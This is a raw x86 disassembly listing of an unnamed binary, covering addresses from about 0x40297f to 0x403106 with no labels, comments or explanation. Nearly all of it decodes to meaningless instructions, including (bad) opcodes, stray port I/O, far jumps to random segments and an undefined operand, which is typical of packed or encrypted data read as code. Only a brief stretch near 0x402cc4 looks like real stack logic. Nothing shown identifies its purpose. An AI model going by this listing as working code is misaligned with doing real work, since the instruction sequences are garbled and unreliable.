  40297f:	add    esi,DWORD PTR ds:0xf005d6ee
  402985:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402986:	lods   al,BYTE PTR ds:[esi]
  402987:	repz out dx,al
  402989:	xchg   cl,bh
  40298b:	sbb    al,0x0
  40298d:	and    bh,BYTE PTR [ebx-0x5e]
  402990:	hlt    
  402991:	aad    0x3e
  402993:	jns    0x402a0f
  402995:	and    dh,bh
  402997:	inc    edi
  402998:	ror    BYTE PTR [ebx+0x16],1
  40299b:	in     al,dx
  40299c:	jmp    0xbe0d:0xa08ef82c
  4029a3:	sar    DWORD PTR [ecx],1
  4029a5:	mov    al,0x2d
  4029a7:	dec    ecx
  4029a8:	mov    ecx,0xcd8e1831
  4029ad:	call   0xd7a29e93
  4029b2:	pop    esi
  4029b3:	arpl   WORD PTR [edi-0x9f7bee6],si
  4029b9:	scas   eax,DWORD PTR es:[edi]
  4029ba:	loopne 0x402a26
  4029bc:	adc    al,0x94
  4029be:	or     dh,BYTE PTR [esi+0x1f0b93ee]
  4029c4:	mov    edx,0x728123d9
  4029c9:	ins    DWORD PTR es:[edi],dx
  4029ca:	and    eax,0xd825fcb5
  4029cf:	sub    DWORD PTR [edx],ebp
  4029d1:	or     DWORD PTR [ebx+0x62a86610],edx
  4029d7:	fcomp  DWORD PTR [ecx+0x56]
  4029da:	mov    ecx,0x8c8bf215
  4029df:	lds    ebx,FWORD PTR [bx+0x71a1]
  4029e4:	loop   0x4029c2
  4029e6:	cwde   
  4029e7:	mov    bl,0x47
  4029e9:	and    eax,DWORD PTR [ebx+0x44cc3d00]
  4029ef:	ins    DWORD PTR es:[edi],dx
  4029f0:	pushf  
  4029f1:	and    al,0xe7
  4029f3:	fimul  WORD PTR [ebx+0x34]
  4029f6:	jl     0x402995
  4029f8:	add    cl,BYTE PTR [edx-0x75]
  4029fb:	test   al,0x6
  4029fd:	lahf   
  4029fe:	cdq    
  4029ff:	sar    BYTE PTR [esi],1
  402a01:	pop    ebx
  402a02:	cmp    edx,edx
  402a04:	into   
  402a05:	inc    ebp
  402a06:	jns    0x402a57
  402a08:	sbb    esi,ecx
  402a0a:	popf   
  402a0b:	pop    ss
  402a0c:	push   es
  402a0d:	in     eax,dx
  402a0e:	repz fadd QWORD PTR [edx-0x30]
  402a12:	call   0x25f53069
  402a17:	fdiv   QWORD PTR [esi]
  402a19:	in     al,dx
  402a1a:	mov    eax,ds:0x5ce92d0d
  402a1f:	push   0x75
  402a21:	jo     0x4029d2
  402a23:	lods   al,BYTE PTR ds:[esi]
  402a24:	pop    edi
  402a25:	xchg   ecx,eax
  402a26:	aam    0x62
  402a28:	fnstcw WORD PTR [esi-0xe65c3a5]
  402a2e:	repnz push ss
  402a30:	adc    eax,0xbafb3cc4
  402a35:	dec    ebx
  402a36:	fdiv   DWORD PTR [ebp+ebp*4+0x32]
  402a3a:	xor    DWORD PTR [edi],eax
  402a3c:	inc    edx
  402a3d:	jb     0x402a45
  402a3f:	arpl   WORD PTR [ebx-0x509decd4],dx
  402a45:	(bad)
  402a48:	push   0x90c207d6
  402a4d:	fnstsw WORD PTR [edi]
  402a4f:	pop    ebp
  402a50:	pop    esp
  402a51:	ins    BYTE PTR es:[edi],dx
  402a52:	ds fwait
  402a54:	mov    al,0x24
  402a56:	cld    
  402a57:	psubw  mm2,QWORD PTR [esi]
  402a5a:	adc    eax,0x828a33bf
  402a5f:	inc    ebx
  402a60:	pop    esp
  402a61:	ficom  DWORD PTR [edi]
  402a63:	or     DWORD PTR [edx-0x5438e2b4],edx
  402a69:	aam    0x7f
  402a6b:	mov    edi,0xb7de8324
  402a70:	sbb    BYTE PTR [ecx+0x16],bl
  402a73:	mov    ds:0x659a9fb6,eax
  402a78:	mov    eax,ds:0x1b319188
  402a7d:	addr16 and al,0x4e
  402a80:	cmp    ch,BYTE PTR [esi-0x376abe27]
  402a86:	es and bh,bl
  402a89:	ds mov dh,0x1f
  402a8c:	xchg   edi,eax
  402a8d:	stos   DWORD PTR es:[edi],eax
  402a8e:	scas   al,BYTE PTR es:[edi]
  402a8f:	sbb    ebx,ebp
  402a91:	pop    edi
  402a92:	jge    0x402a86
  402a94:	push   eax
  402a95:	mov    ch,0xfb
  402a97:	aad    0xac
  402a99:	fcomp  QWORD PTR [edx+0x2c]
  402a9c:	call   0xb834:0xe64aefa8
  402aa3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402aa4:	or     DWORD PTR [esi+0x17],eax
  402aa7:	mov    dh,0x4e
  402aa9:	lds    edi,FWORD PTR [edi+0x671c24b5]
  402aaf:	push   0x660aae4d
  402ab4:	xor    ebp,edx
  402ab6:	fwait
  402ab7:	jno    0x402a75
  402ab9:	stc    
  402aba:	push   eax
  402abb:	xor    al,0x9f
  402abd:	xor    esp,ebx
  402abf:	clc    
  402ac0:	fwait
  402ac1:	cmp    DWORD PTR [eax],eax
  402ac3:	cs mov ebp,0x951ab66f
  402ac9:	sub    BYTE PTR ds:0x3c3ae56e,dh
  402acf:	shl    ebp,1
  402ad1:	push   esp
  402ad2:	scas   al,BYTE PTR es:[edi]
  402ad3:	test   BYTE PTR [esi+edx*4+0x5a],ch
  402ad7:	sbb    eax,0x80fb3358
  402adc:	jns    0x402b37
  402ade:	out    0xc5,eax
  402ae0:	push   edi
  402ae1:	pop    es
  402ae2:	ins    BYTE PTR es:[edi],dx
  402ae3:	pop    edi
  402ae4:	push   ebx
  402ae5:	push   esp
  402ae6:	cmc    
  402ae7:	mov    ebx,0xbf86dd0
  402aec:	popa   
  402aed:	je     0x402b69
  402aef:	outs   dx,BYTE PTR ds:[esi]
  402af0:	xor    DWORD PTR [ecx],eax
  402af2:	pop    ebx
  402af3:	call   0xaf4c:0xe6370c6d
  402afa:	sti    
  402afb:	dec    ebp
  402afc:	pop    esp
  402afd:	mov    ds:0xbba5386c,al
  402b02:	sub    al,0x11
  402b04:	ret    0xbf70
  402b07:	xchg   DWORD PTR [ecx+0x64e139e],esi
  402b0d:	retf   
  402b0e:	idiv   BYTE PTR [ebx+0x2e81ed2]
  402b14:	push   ebp
  402b15:	dec    ebp
  402b16:	mov    dl,0x82
  402b18:	imul   BYTE PTR [esi+edi*8-0x4d54da0b]
  402b1f:	mov    ah,0x93
  402b21:	xor    eax,DWORD PTR [ebx]
  402b23:	div    DWORD PTR [ebx+edi*1+0x74]
  402b27:	fistp  QWORD PTR [ebp-0x6358eea5]
  402b2d:	dec    esp
  402b2e:	xchg   ebx,eax
  402b2f:	or     al,0xea
  402b31:	pop    ebx
  402b32:	clc    
  402b33:	and    eax,0xb713d68d
  402b38:	dec    edx
  402b39:	das    
  402b3a:	call   0x8d59:0x7939da28
  402b41:	scas   al,BYTE PTR es:[edi]
  402b42:	mov    eax,ds:0x5835e1c9
  402b47:	(bad)  
  402b48:	out    0xa4,al
  402b4a:	int    0x7a
  402b4c:	hlt    
  402b4d:	test   eax,edi
  402b4f:	rcr    DWORD PTR [eax+ebp*1-0x44],cl
  402b53:	jg     0x402b5e
  402b55:	lahf   
  402b56:	ins    BYTE PTR es:[edi],dx
  402b57:	in     al,dx
  402b58:	push   cs
  402b59:	out    dx,eax
  402b5a:	test   al,0xf6
  402b5c:	xor    BYTE PTR [ecx],bl
  402b5e:	aam    0x60
  402b60:	test   ebp,0x5ce812e
  402b66:	bound  edi,QWORD PTR [ecx+edi*8+0x40119d12]
  402b6d:	fist   WORD PTR [esi]
  402b6f:	adc    esp,ebx
  402b71:	enter  0x1c2a,0x75
  402b75:	push   cs
  402b76:	push   edx
  402b77:	jbe    0x402ba3
  402b79:	dec    esi
  402b7a:	push   ds
  402b7b:	mov    WORD PTR [ebx-0x76],ss
  402b7e:	jge    0x402b98
  402b80:	das    
  402b81:	(bad)  
  402b82:	repnz neg eax
  402b85:	js     0x402bb5
  402b87:	in     al,0x26
  402b89:	in     eax,0x5b
  402b8b:	outs   dx,BYTE PTR ds:[esi]
  402b8c:	repz mov eax,0xc171f979
  402b92:	xor    eax,0x40e8e0d7
  402b97:	mov    al,0xa2
  402b99:	scas   al,BYTE PTR es:[edi]
  402b9a:	popa   
  402b9b:	cdq    
  402b9c:	sbb    eax,0xd9c20f2e
  402ba1:	(bad)  
  402ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402ba3:	mov    ecx,0x15f07b3a
  402ba8:	inc    ebx
  402ba9:	lods   eax,DWORD PTR ds:[esi]
  402baa:	cmp    al,0x4f
  402bac:	xor    edi,DWORD PTR [esi]
  402bae:	scas   al,BYTE PTR es:[edi]
  402baf:	mov    dh,0x2d
  402bb1:	dec    ebp
  402bb2:	add    BYTE PTR [eax-0x57],al
  402bb5:	lods   al,BYTE PTR ds:[esi]
  402bb6:	outs   dx,BYTE PTR ds:[esi]
  402bb7:	sub    DWORD PTR [edi+0x1a50873e],eax
  402bbd:	sub    eax,esi
  402bbf:	dec    edx
  402bc0:	xchg   edi,eax
  402bc1:	and    al,BYTE PTR [ebx]
  402bc3:	xor    al,cl
  402bc5:	sub    ebx,ecx
  402bc7:	cmp    ecx,ecx
  402bc9:	in     eax,dx
  402bca:	pop    ds
  402bcb:	mov    cl,0x81
  402bcd:	jge    0x402b91
  402bcf:	in     eax,0x7e
  402bd1:	sub    BYTE PTR [edi],0xf
  402bd4:	inc    esi
  402bd5:	push   es
  402bd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402bd7:	cdq    
  402bd8:	push   cs
  402bd9:	xchg   ebx,eax
  402bda:	xor    eax,0xc57c9675
  402bdf:	scas   eax,DWORD PTR es:[edi]
  402be0:	cmp    eax,0x1f0015cd
  402be5:	fsubr  QWORD PTR [edi-0x278422eb]
  402beb:	test   al,0x1a
  402bed:	or     DWORD PTR [esp+edx*1+0x8],ebx
  402bf1:	mov    al,ds:0xab1813e
  402bf6:	and    BYTE PTR ds:0x62b68b7d,bh
  402bfc:	jmp    0x402c40
  402bfe:	mov    eax,0x175603bd
  402c03:	xchg   ecx,eax
  402c04:	dec    ebp
  402c05:	jae    0x402bf7
  402c07:	(bad)  
  402c08:	call   0x2a44e739
  402c0d:	test   BYTE PTR [eax+ebp*8+0x168ef287],bl
  402c14:	(bad)  
  402c16:	mov    dh,0xf6
  402c18:	mov    dl,al
  402c1a:	sbb    DWORD PTR [eax-0xe],esi
  402c1d:	inc    eax
  402c1e:	adc    BYTE PTR [edi+0x7e],0x5d
  402c22:	lods   eax,DWORD PTR ds:[esi]
  402c23:	sti    
  402c24:	mov    DWORD PTR [ecx-0x5bdb9cce],eax
  402c2a:	ja     0x402c6f
  402c2c:	leave  
  402c2d:	dec    esp
  402c2e:	mov    dl,0x53
  402c30:	inc    eax
  402c31:	inc    eax
  402c32:	mov    cs,WORD PTR [eax-0x57]
  402c35:	push   0x25
  402c37:	adc    BYTE PTR [ecx-0x76315dfa],bl
  402c3d:	fld    QWORD PTR [ecx+0x13deccaa]
  402c43:	xor    eax,0x61117c99
  402c48:	xchg   ecx,eax
  402c49:	in     al,dx
  402c4a:	xchg   esi,eax
  402c4b:	mov    al,ds:0xf0cf8eac
  402c50:	cmp    DWORD PTR [eax+0x3ffcfad9],0x70
  402c57:	xchg   DWORD PTR [ecx+0x47],edx
  402c5a:	pop    ecx
  402c5b:	jl     0x402c84
  402c5d:	rcl    DWORD PTR [esi],cl
  402c5f:	mov    ah,BYTE PTR [ebx+eax*2+0x56]
  402c63:	pop    esi
  402c64:	ret    0xabcf
  402c67:	sbb    DWORD PTR [eax+0x208f38c0],esp
  402c6d:	push   ss
  402c6e:	shl    DWORD PTR [ecx-0x9],1
  402c71:	cwde   
  402c72:	sbb    ah,BYTE PTR [eax+0x72]
  402c75:	pop    ebp
  402c76:	adc    eax,0x67fb9edd
  402c7b:	xlat   BYTE PTR ds:[ebx]
  402c7c:	test   edi,edx
  402c7e:	sbb    BYTE PTR [ebx],dh
  402c80:	dec    ebp
  402c81:	xchg   ecx,eax
  402c82:	shl    esi,1
  402c84:	repz push ds
  402c86:	pop    esp
  402c87:	(bad)  
  402c88:	int    0x88
  402c8a:	call   0x1b46:0x28b55a9
  402c91:	add    bh,BYTE PTR [edx]
  402c93:	arpl   WORD PTR [ebp-0x25],si
  402c96:	repz inc eax
  402c98:	dec    edx
  402c99:	pop    esi
  402c9a:	cmp    al,0x72
  402c9c:	jmp    0x402c38
  402c9e:	dec    edi
  402c9f:	adc    al,0xfd
  402ca1:	jb     0x402c89
  402ca3:	arpl   WORD PTR [ebx+0xa63992f],dx
  402ca9:	cmp    DWORD PTR [ebp+0x2d3ee054],ecx
  402caf:	stos   BYTE PTR es:[edi],al
  402cb0:	sbb    bh,BYTE PTR [eax+0x37581902]
  402cb6:	sub    dl,bl
  402cb8:	aad    0x41
  402cba:	add    ebp,DWORD PTR [esi+0x7e]
  402cbd:	aam    0x9
  402cbf:	add    eax,0xaa
  402cc4:	push   eax
  402cc5:	mov    eax,DWORD PTR [ebp-0x18]
  402cc8:	mov    eax,DWORD PTR [eax+0x198]
  402cce:	push   DWORD PTR [eax]
  402cd0:	call   0x40c099
  402cd5:	mov    DWORD PTR [ebp-0x4],eax
  402cd8:	cmp    DWORD PTR [ebp-0x4],0x0
  402cdc:	lea    eax,[ebp+0x4]
  402cdf:	mov    DWORD PTR [ebp-0x38],eax
  402ce2:	je     0x404656
  402ce8:	lea    eax,[ebp-0xc]
  402ceb:	mov    DWORD PTR [ebp-0x30],eax
  402cee:	mov    eax,DWORD PTR [ebp-0x4c]
  402cf1:	xor    eax,esi
  402cf3:	add    eax,edi
  402cf5:	mov    DWORD PTR [ebp-0x34],eax
  402cf8:	mov    eax,DWORD PTR [ebp-0x28]
  402cfb:	xor    eax,esi
  402cfd:	add    eax,edi
  402cff:	mov    DWORD PTR [ebp-0x20],eax
  402d02:	mov    eax,DWORD PTR [ebp-0x4]
  402d05:	mov    DWORD PTR [ebp-0x24],eax
  402d08:	lea    eax,[ebp-0x98]
  402d0e:	mov    DWORD PTR [ebp-0x8],eax
  402d11:	mov    eax,DWORD PTR [ebp-0x10]
  402d14:	mov    DWORD PTR [ebp-0x10],eax
  402d17:	mov    eax,DWORD PTR [ebp-0x1c]
  402d1a:	mov    DWORD PTR [ebp-0x40],ebx
  402d1d:	mov    DWORD PTR [ebp-0x2c],eax
  402d20:	mov    eax,DWORD PTR [ebp-0x40]
  402d23:	mov    ecx,DWORD PTR [ebp-0x8]
  402d26:	xor    eax,esi
  402d28:	add    eax,0x32729b
  402d2d:	jmp    0x40313b
  402d32:	stos   DWORD PTR es:[edi],eax
  402d33:	addr16 clc 
  402d35:	in     eax,0x50
  402d37:	loope  0x402dac
  402d39:	jno    0x402d4f
  402d3b:	jo     0x402d34
  402d3d:	fs (bad) 
  402d41:	sbb    BYTE PTR [eax+0x6f7e7e09],0x7d
  402d48:	jle    0x402dc8
  402d4a:	push   0xd7dfe9f0
  402d4f:	lods   eax,DWORD PTR ds:[esi]
  402d50:	add    ebp,DWORD PTR [ebx+0x50]
  402d53:	fs lock pop ecx
  402d56:	bound  eax,QWORD PTR [esi+edx*8-0x5c]
  402d5a:	jl     0x402dc4
  402d5c:	pop    ds
  402d5d:	imul   ebx,ebp,0xffffffba
  402d60:	jle    0x402ce5
  402d62:	dec    ecx
  402d63:	inc    edx
  402d64:	jp     0x402d2d
  402d66:	ror    BYTE PTR [eax-0x20],0xef
  402d6a:	retf   0xa6c4
  402d6d:	ss dec edx
  402d6f:	repnz push 0x5a1e531b
  402d75:	aas    
  402d76:	cld    
  402d77:	retf   
  402d78:	(bad)  
  402d79:	cmp    al,0x46
  402d7b:	lods   al,BYTE PTR ds:[esi]
  402d7c:	int    0x7
  402d7e:	ss pop eax
  402d80:	mov    ds:0xcb2a2974,al
  402d85:	lea    esp,[edx]
  402d87:	sti    
  402d88:	xchg   BYTE PTR [ebx],cl
  402d8a:	pushf  
  402d8b:	and    edi,DWORD PTR [eax+0x1bb277a1]
  402d91:	jp     0x402d59
  402d93:	stos   DWORD PTR es:[edi],eax
  402d94:	outs   dx,BYTE PTR ds:[esi]
  402d95:	mov    bh,0x17
  402d97:	gs test al,0xf8
  402d9a:	aaa    
  402d9b:	lahf   
  402d9c:	test   al,0x7b
  402d9e:	aas    
  402d9f:	pop    ebp
  402da0:	push   esp
  402da1:	xor    esi,ebx
  402da3:	popf   
  402da4:	fs retf 0x7ada
  402da8:	dec    eax
  402da9:	dec    ebp
  402daa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402dab:	inc    edx
  402dac:	lock lods al,BYTE PTR ds:[esi]
  402dae:	fwait
  402daf:	mov    ecx,0x4a5c4049
  402db4:	gs inc ebx
  402db6:	call   0x69d3b5e8
  402dbb:	(bad)  
  402dbc:	jmp    0x402dcd
  402dbe:	add    edi,ecx
  402dc0:	std    
  402dc1:	push   cs
  402dc2:	ins    BYTE PTR es:[edi],dx
  402dc3:	loopne 0x402e44
  402dc5:	sahf   
  402dc6:	aas    
  402dc7:	aaa    
  402dc8:	lds    eax,FWORD PTR [ecx]
  402dca:	adc    al,0x28
  402dcc:	ss cmp eax,0x4d0cf5a1
  402dd2:	fsub   st,st(2)
  402dd4:	gs aam 0x5f
  402dd7:	xchg   ch,dl
  402dd9:	out    dx,al
  402dda:	mov    esp,0x976835a
  402ddf:	jg     0x402df7
  402de1:	push   0xe488fb45
  402de6:	test   BYTE PTR [ebp-0x7f97e470],bl
  402dec:	xchg   BYTE PTR [ebx],bh
  402dee:	gs mov ah,0xf7
  402df1:	scas   al,BYTE PTR es:[edi]
  402df2:	rcl    al,1
  402df4:	jnp    0x402da4
  402df6:	mov    edi,0x336fc045
  402dfb:	ret    0xee80
  402dfe:	lock les edi,FWORD PTR [ebx+0x145c0b8b]
  402e05:	cld    
  402e06:	idiv   DWORD PTR [ebp-0x6a95cc90]
  402e0c:	pop    ecx
  402e0d:	and    eax,0xa961247d
  402e12:	push   0x301094e7
  402e17:	out    dx,eax
  402e18:	lods   al,BYTE PTR ds:[esi]
  402e19:	add    DWORD PTR [esi],ebx
  402e1b:	xchg   ecx,eax
  402e1c:	aas    
  402e1d:	add    edi,DWORD PTR [esi-0x7e9edcef]
  402e23:	inc    edi
  402e24:	fld    QWORD PTR [esp+ecx*4+0x7a9c0732]
  402e2b:	mov    ebp,0xb9538aaf
  402e30:	repz pop ecx
  402e32:	(bad)  
  402e33:	mov    dh,0x9d
  402e35:	popf   
  402e36:	mov    eax,0xb4f35f46
  402e3b:	mov    dl,0x4f
  402e3d:	mov    edx,0xad81bad5
  402e42:	es pop eax
  402e44:	or     al,0xe5
  402e46:	mov    eax,0xab0b0876
  402e4b:	xor    BYTE PTR [eax+eiz*4-0x76],0x6e
  402e50:	adc    DWORD PTR [ebx+0x6708d530],eax
  402e56:	cmp    BYTE PTR [esi-0x11],0x68
  402e5a:	pop    edi
  402e5b:	fsub   st(3),st
  402e5d:	ss pop edi
  402e5f:	out    dx,eax
  402e60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e61:	lods   al,BYTE PTR ds:[esi]
  402e62:	std    
  402e63:	dec    edx
  402e64:	rol    edx,cl
  402e66:	sbb    ch,dh
  402e68:	jle    0x402e4e
  402e6a:	lds    ebp,FWORD PTR [eax+ebx*8+0x70]
  402e6e:	outs   dx,BYTE PTR ds:[esi]
  402e6f:	sahf   
  402e70:	test   BYTE PTR [edx+0xdee202c],dh
  402e76:	pop    esp
  402e77:	outs   dx,BYTE PTR ds:[esi]
  402e78:	xchg   esp,eax
  402e79:	repz fdivr DWORD PTR [ecx+ecx*4]
  402e7d:	add    edx,esi
  402e7f:	jne    0x402e23
  402e81:	dec    eax
  402e82:	mov    esi,0x49f8e9bb
  402e87:	cli    
  402e88:	pusha  
  402e89:	push   esp
  402e8a:	scas   eax,DWORD PTR es:[edi]
  402e8b:	sti    
  402e8c:	stc    
  402e8d:	jbe    0x402e55
  402e8f:	dec    ebp
  402e90:	add    eax,0x24472ba6
  402e95:	cmc    
  402e96:	xchg   ebx,eax
  402e97:	sbb    DWORD PTR [eax-0x6b],edx
  402e9a:	sub    dh,al
  402e9c:	enter  0xf490,0xa1
  402ea0:	(bad)  
  402ea2:	xchg   eax,edi
  402ea4:	xchg   edi,eax
  402ea5:	ss ret 
  402ea7:	lods   al,BYTE PTR ds:[esi]
  402ea8:	pop    ds
  402ea9:	mov    edi,0xb9162695
  402eae:	xor    eax,0x693b6564
  402eb3:	pop    eax
  402eb4:	into   
  402eb5:	inc    ebp
  402eb6:	call   0x7068:0xda368dd
  402ebd:	clc    
  402ebe:	xchg   edx,eax
  402ebf:	imul   esp,DWORD PTR [esi],0x9
  402ec2:	imul   edi,ebx,0x72
  402ec5:	ins    BYTE PTR es:[edi],dx
  402ec6:	jns    0x402ea1
  402ec8:	push   edi
  402ec9:	cmovno edi,ecx
  402ecc:	mov    ax,0xf436
  402ed0:	inc    esi
  402ed1:	and    esp,DWORD PTR [edx-0xde04d3f]
  402ed7:	sahf   
  402ed8:	and    bh,bl
  402eda:	(bad)  
  402edc:	dec    ebx
  402edd:	fnstsw WORD PTR [ebp-0x9]
  402ee0:	or     DWORD PTR [eax],eax
  402ee2:	sahf   
  402ee3:	jbe    0x402ee0
  402ee5:	leave  
  402ee6:	sub    eax,0xd44306bb
  402eeb:	xor    al,0x9a
  402eed:	stos   BYTE PTR es:[edi],al
  402eee:	or     ah,0x3e
  402ef1:	sti    
  402ef2:	mov    ds:0x4241ebc3,al
  402ef7:	xchg   ecx,eax
  402ef8:	repz out dx,al
  402efa:	inc    ecx
  402efb:	fst    DWORD PTR [edi+0x62]
  402efe:	fwait
  402eff:	lods   eax,DWORD PTR ds:[esi]
  402f00:	int    0x97
  402f02:	dec    esp
  402f03:	adc    dl,ch
  402f05:	xor    esp,esi
  402f07:	mov    ds:0x96d518cf,al
  402f0c:	jle    0x402ec0
  402f0e:	pusha  
  402f0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402f10:	pop    ebp
  402f11:	call   0x31bc:0x4a99a180
  402f18:	xor    ebx,DWORD PTR [ebx]
  402f1a:	push   0xdbe3cacf
  402f1f:	adc    edi,DWORD PTR [esi+ecx*8]
  402f22:	xchg   ebx,eax
  402f23:	jecxz  0x402f06
  402f25:	lods   eax,DWORD PTR ds:[esi]
  402f26:	jmp    0xa0f4:0x979dacb7
  402f2d:	in     al,0x39
  402f2f:	xor    ebx,edx
  402f31:	lds    ebp,FWORD PTR [edx+ecx*4+0xa]
  402f35:	inc    eax
  402f37:	sbb    eax,DWORD PTR [edx+0x7ba6cd14]
  402f3d:	out    dx,al
  402f3e:	and    BYTE PTR ds:0xf619a6f7,cl
  402f44:	xor    edi,ecx
  402f46:	cmp    DWORD PTR ds:0xd26ce492,ebp
  402f4c:	push   es
  402f4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402f4e:	fwait
  402f4f:	rcl    DWORD PTR [edx-0x5c0fe10f],0xd4
  402f56:	sub    al,0x25
  402f58:	mov    ds:0x6e90cf88,al
  402f5d:	pushf  
  402f5e:	das    
  402f5f:	cmp    bh,dh
  402f61:	mov    dl,0x8
  402f63:	push   edx
  402f64:	mov    bh,0xfd
  402f66:	(bad)  
  402f67:	push   ecx
  402f68:	sbb    eax,0x46abacc0
  402f6d:	dec    ecx
  402f6e:	dec    ebp
  402f6f:	out    dx,al
  402f70:	jcxz   0x402ef4
  402f73:	rcl    DWORD PTR [esi+0x65642d76],cl
  402f79:	retf   0xa608
  402f7c:	outs   dx,BYTE PTR ds:[esi]
  402f7d:	addr16 jmp 0xbc15:0xb3c6dda8
  402f85:	push   ds
  402f86:	and    DWORD PTR [edi],eax
  402f88:	loope  0x402fa9
  402f8a:	out    dx,al
  402f8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402f8c:	push   ss
  402f8d:	mov    fs,WORD PTR [esp+eax*8-0x2a]
  402f91:	(bad)  
  402f92:	iret   
  402f93:	sar    bh,0x86
  402f96:	not    ch
  402f98:	cwde   
  402f99:	xlat   BYTE PTR ds:[ebx]
  402f9a:	inc    esp
  402f9b:	xchg   ecx,eax
  402f9c:	ret    
  402f9d:	jge    0x403013
  402f9f:	scas   al,BYTE PTR es:[edi]
  402fa0:	retf   
  402fa1:	pop    edi
  402fa2:	imul   eax,DWORD PTR [esi],0x1a3483aa
  402fa8:	sbb    al,0x8b
  402faa:	inc    edi
  402fab:	lea    ecx,[ecx+0x5a]
  402fae:	test   DWORD PTR [ecx-0x180bd6f3],ebx
  402fb4:	pop    ebp
  402fb5:	(bad)  [ebx]
  402fb7:	int3   
  402fb8:	cld    
  402fb9:	out    0xbb,al
  402fbb:	sbb    al,0x13
  402fbd:	and    al,0x77
  402fbf:	mov    WORD PTR [ebx],ds
  402fc1:	jl     0x403033
  402fc3:	add    BYTE PTR gs:[edx-0x12],dh
  402fc7:	cli    
  402fc8:	imul   ebp,DWORD PTR [esi+0x7e],0x3b
  402fcc:	sub    eax,0x684d2fa9
  402fd1:	mov    cl,0xb3
  402fd3:	ds push ebp
  402fd5:	mov    bh,0x18
  402fd7:	push   eax
  402fd8:	or     DWORD PTR [ecx+eiz*1-0x45],0x29bbd7a0
  402fe0:	int3   
  402fe1:	mov    esi,0xc57d62f6
  402fe6:	push   ecx
  402fe7:	cs inc esi
  402fe9:	(bad)  
  402fea:	jmp    0x402f92
  402fec:	mov    eax,ds:0x9749b8a7
  402ff1:	inc    edx
  402ff2:	sbb    al,0xed
  402ff4:	jo     0x402ffa
  402ff6:	outs   dx,DWORD PTR ds:[esi]
  402ff7:	hlt    
  402ff8:	mov    ds:0x9e731ea6,eax
  402ffd:	or     al,0x82
  402fff:	pop    edi
  403000:	in     eax,dx
  403001:	pushf  
  403002:	retf   0xb3e5
  403005:	leave  
  403006:	std    
  403007:	pop    ecx
  403008:	lock sbb DWORD PTR [ebx],ebp
  40300b:	xchg   ebp,eax
  40300c:	shr    eax,1
  40300e:	cmp    al,0xef
  403010:	sub    DWORD PTR [esi+0x66],0x6d15b914
  403017:	mov    ?,edi
  403019:	jle    0x402fc0
  40301b:	daa    
  40301c:	pusha  
  40301d:	in     eax,0x90
  40301f:	push   ss
  403020:	push   eax
  403021:	adc    BYTE PTR [edi+edi*4+0x7791d539],0x20
  403029:	push   es
  40302a:	add    ch,BYTE PTR [ecx+edx*1+0x5ae166ad]
  403031:	ds jae 0x402fb4
  403034:	pop    ebp
  403035:	sbb    ebp,DWORD PTR [ebx]
  403037:	rol    DWORD PTR ds:0x7e0f6c71,cl
  40303d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40303e:	jae    0x402fc8
  403040:	push   edi
  403041:	pushf  
  403042:	mov    al,0x36
  403044:	pop    edi
  403045:	dec    edx
  403046:	jns    0x403064
  403048:	retf   
  403049:	add    al,0x3d
  40304b:	jae    0x4030bd
  40304d:	mov    ebx,0xacc62503
  403052:	fstp   QWORD PTR [ebp-0x35b4107f]
  403058:	and    ebp,ebp
  40305a:	sbb    al,0x69
  40305c:	push   ebx
  40305d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40305e:	int    0xf0
  403060:	call   0x9bbd833c
  403065:	call   0x76e3072e
  40306a:	inc    edx
  40306b:	lea    esp,[edx+0x5b]
  40306e:	xchg   ecx,eax
  40306f:	loop   0x4030db
  403071:	dec    BYTE PTR [ecx]
  403073:	loopne 0x403071
  403075:	mov    DWORD PTR [ebp-0x3a],eax
  403078:	xchg   bh,ah
  40307a:	inc    ecx
  40307b:	iret   
  40307c:	add    bh,bl
  40307e:	out    dx,eax
  40307f:	xchg   ebx,eax
  403080:	inc    ebx
  403081:	enter  0x1bad,0x3
  403085:	rcl    edi,1
  403087:	fcom   QWORD PTR [ecx+0x19]
  40308a:	add    BYTE PTR [esi+0x55e7fa37],cl
  403090:	and    ah,BYTE PTR [ecx-0x49]
  403093:	push   ebp
  403094:	xchg   esp,eax
  403095:	mov    ah,0x9d
  403097:	gs mov eax,cs
  40309a:	iret   
  40309b:	mov    al,0x4c
  40309d:	pop    ebx
  40309e:	xchg   ecx,eax
  40309f:	xlat   BYTE PTR ds:[ebx]
  4030a0:	int3   
  4030a1:	jle    0x40311d
  4030a3:	jecxz  0x403099
  4030a5:	xchg   ecx,eax
  4030a6:	lahf   
  4030a7:	(bad)  
  4030a8:	cli    
  4030a9:	mov    dl,0xab
  4030ab:	pop    esp
  4030ac:	repz mov bh,0x95
  4030af:	pop    ss
  4030b0:	call   0xb3553276
  4030b5:	stos   BYTE PTR es:[edi],al
  4030b6:	adc    DWORD PTR [ebx-0x65b8ca],esi
  4030bc:	mov    dl,0xeb
  4030be:	sub    eax,0x3c75dac8
  4030c3:	pop    ebp
  4030c4:	jns    0x4030a6
  4030c6:	mov    al,ds:0x51a84bab
  4030cb:	and    dh,BYTE PTR [ecx+0x3acb5b7f]
  4030d1:	and    eax,0x69f05f7a
  4030d6:	mov    BYTE PTR [esi+0x64],dh
  4030d9:	mov    edx,ecx
  4030db:	cmc    
  4030dc:	or     al,0x12
  4030de:	and    edi,DWORD PTR ds:0x62fc6f37
  4030e4:	lods   al,BYTE PTR ds:[esi]
  4030e5:	xchg   ebp,eax
  4030e6:	and    eax,0x3df509
  4030ec:	cli    
  4030ed:	and    al,0xe3
  4030ef:	mov    ch,0xec
  4030f1:	xchg   edi,eax
  4030f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4030f3:	mov    esi,0x882cc043
  4030f8:	or     al,0x5b
  4030fa:	lods   eax,DWORD PTR ds:[esi]
  4030fb:	mov    BYTE PTR [ecx-0x6f],bh
  4030fe:	sbb    BYTE PTR [edi+0x3b664d5a],cl
  403104:	sub    al,dh
  403106:	jne    0x4030ce
